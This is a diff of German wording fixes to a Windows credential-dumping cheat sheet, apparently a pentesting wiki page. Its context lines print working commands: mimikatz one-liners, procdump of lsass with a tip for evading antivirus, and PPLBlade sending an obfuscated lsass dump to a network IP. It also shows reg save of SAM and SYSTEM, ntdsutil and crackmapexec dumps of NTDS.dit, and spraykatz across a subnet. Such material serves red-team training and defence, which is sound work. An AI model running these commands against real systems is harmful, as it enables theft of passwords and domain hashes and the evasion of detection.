@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Finde andere Dinge, die Mimikatz tun kann auf** [**dieser Seite**](credentials-mimikatz.md)**.**
+**Finde andere Dinge, die Mimikatz tun kann, auf** [**dieser Seite**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Anmeldeinformationen mit Meterpreter
 
-Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **nach Passwörtern und Hashes** im Inneren des Opfers zu suchen.
+Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **nach Passwörtern und Hashes** im Opfer zu suchen.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -50,7 +50,7 @@ mimikatz_command -f "lsadump::sam"
 ### Procdump + Mimikatz
 
 Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
-Sie können dieses Tool verwenden, um den **lsass-Prozess zu dumpen**, den **Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump zu **extrahieren**.
+Sie können dieses Tool verwenden, um **den lsass-Prozess zu dumpen**, **den Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump **zu extrahieren**.
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -67,7 +67,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** erkennen. Daher ist es **diskreter**, den **PID** von lsass.exe als **Argument** an procdump **statt des Namens lsass.exe** zu übergeben.
+**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** erkennen. Daher ist es **stealthier**, den **PID** von lsass.exe als **Argument** an procdump **statt des Namens lsass.exe** zu übergeben.
 
 ### Dumpen von lsass mit **comsvcs.dll**
 
@@ -98,12 +98,12 @@ Get-Process -Name LSASS
 ```
 ## Dumpen von lsass mit PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das das Obfuskieren von Speicherdumps unterstützt und diese auf entfernte Arbeitsstationen überträgt, ohne sie auf der Festplatte abzulegen.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das das Obfuskieren von Speicherdumps unterstützt und diese auf Remote-Workstations überträgt, ohne sie auf der Festplatte abzulegen.
 
 **Hauptfunktionen**:
 
 1. Umgehung des PPL-Schutzes
-2. Obfuskation von Speicherdump-Dateien, um Mechanismen zur signaturbasierten Erkennung durch Defender zu umgehen
+2. Obfuskierung von Speicherdump-Dateien, um Mechanismen zur signaturbasierten Erkennung durch Defender zu umgehen
 3. Hochladen von Speicherdumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless dump)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
@@ -133,11 +133,11 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Diese Dateien sollten **befinden sich** in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ Aber **du kannst sie nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.
+Diese Dateien sollten sich **befinden** in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ Aber **du kannst sie nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.
 
-### From Registry
+### Aus der Registry
 
-Der einfachste Weg, diese Dateien zu stehlen, besteht darin, eine Kopie aus der Registrierung zu erhalten:
+Der einfachste Weg, diese Dateien zu stehlen, besteht darin, eine Kopie aus der Registry zu erhalten:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
@@ -188,9 +188,9 @@ Die **NTDS.dit**-Datei ist als das Herz von **Active Directory** bekannt und ent
 
 Innerhalb dieser Datenbank werden drei Haupttabellen verwaltet:
 
-- **Datentabelle**: Diese Tabelle ist dafür zuständig, Details über Objekte wie Benutzer und Gruppen zu speichern.
-- **Verknüpfungstabelle**: Sie verfolgt Beziehungen, wie z.B. Gruppenmitgliedschaften.
-- **SD-Tabelle**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gespeichert, um die Sicherheit und den Zugriff auf die gespeicherten Objekte zu gewährleisten.
+- **Daten Tabelle**: Diese Tabelle ist dafür zuständig, Details über Objekte wie Benutzer und Gruppen zu speichern.
+- **Link Tabelle**: Sie verfolgt Beziehungen, wie z.B. Gruppenmitgliedschaften.
+- **SD Tabelle**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gespeichert, um die Sicherheit und den Zugriff auf die gespeicherten Objekte zu gewährleisten.
 
 Weitere Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
@@ -204,7 +204,7 @@ Der Hash wird dreimal verschlüsselt:
 2. Entschlüsseln des **Hashes** mit **PEK** und **RC4**.
 3. Entschlüsseln des **Hashes** mit **DES**.
 
-**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, wird jedoch im **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterschiedlich zwischen Domänencontrollern)** verschlüsselt. Aus diesem Grund müssen Sie, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_) haben.
+**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, wird jedoch **verschlüsselt** in der **NTDS.dit**-Datei unter Verwendung des **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterscheidet sich zwischen Domänencontrollern)**. Aus diesem Grund müssen Sie, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_) haben.
 
 ### Kopieren von NTDS.dit mit Ntdsutil
 
@@ -212,7 +212,7 @@ Verfügbar seit Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Sie könnten auch den [**Volume Shadow Copy**](./#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM Datei** benötigen (nochmals, [**dumpen Sie sie aus der Registry oder verwenden Sie den Volume Shadow Copy**](./#stealing-sam-and-system) Trick).
+Sie können auch den [**Volume Shadow Copy**](./#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM-Datei** benötigen (nochmals, [**dumpen Sie sie aus der Registry oder verwenden Sie den Volume Shadow Copy**](./#stealing-sam-and-system) Trick).
 
 ### **Hashes aus NTDS.dit extrahieren**
 
@@ -230,11 +230,11 @@ Schließlich können Sie auch das **metasploit-Modul** verwenden: _post/windows/
 
 ### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**
 
-NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Geheimnisse extrahiert, sondern auch die gesamten Objekte und deren Attribute für weitere Informationsbeschaffung, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
+NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Es werden nicht nur Geheimnisse extrahiert, sondern auch die gesamten Objekte und deren Attribute für weitere Informationsbeschaffung, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Die `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Vertrauensschlüssel, NT- und LM-Passworthistorien). Neben anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibung, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheitshierarchie und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensarten, Richtung und Attributen...
+Der `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Vertrauensschlüssel, NT- und LM-Passworthistorien). Neben anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibung, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheitshierarchie und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensarten, Richtung und Attributen...
 
 ## Lazagne
 
@@ -250,7 +250,7 @@ Dieses Tool kann verwendet werden, um Anmeldeinformationen aus dem Speicher zu e
 
 ### fgdump
 
-Extrahieren Sie Anmeldeinformationen aus der SAM-Datei
+Extrahieren Sie Anmeldeinformationen aus der SAM-Datei.
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
